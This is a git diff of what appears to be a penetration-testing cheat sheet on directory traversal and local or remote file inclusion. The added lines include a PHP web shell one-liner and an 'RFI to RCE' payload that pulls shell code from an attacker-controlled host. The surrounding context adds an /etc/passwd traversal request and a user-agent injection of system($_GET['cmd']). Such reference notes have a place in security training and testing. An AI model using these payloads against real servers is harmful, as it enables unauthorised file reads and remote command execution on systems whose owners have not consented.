@@ -306,7 +306,7 @@ Tests by putting output to a web viewable directory
 
 
 
-# **<a name="pathtrav">Directory Path Traversal</a>**
+# **<a name="pathtrav">Directory Path Traversal aka LFI </a>**
 
 `GET /image?filename=../../../etc/passwd HTTP/1.1`
 
@@ -335,6 +335,8 @@ odd characters or double encoded
 
 # **<a name="lfi2rce">LFI to RCE</a>**
 
+
+
 ## Log Poisoning
 
 Include the following in a GET request and when you view the access.log file it will show the php info verison  
@@ -362,6 +364,10 @@ should be limited shell
 
 `curl localhost/test.php -d vipertooth=whoami`
 
+or 
+
+`<?php echo shell_exec($_GET['cmd']);?>`
+
 
 ## Proc Environ Injection
 
@@ -371,6 +377,16 @@ http://secureapplication.example/index.php?view=../../../proc/self/environ
 `  
 
 if it works put `GET /<?php system($_GET['cmd']);?>` in the user-agent field then run request 2 like payload
+
+# RFI to RCE
+
+`http://<IP>/something.php?name=a&comment=b&LANG=http://<attackIP>/evil.txt`
+
+```
+cat evil.txt
+<?php echo shell_exec("ipconfig");?>
+```
+
 
 Referances:
 
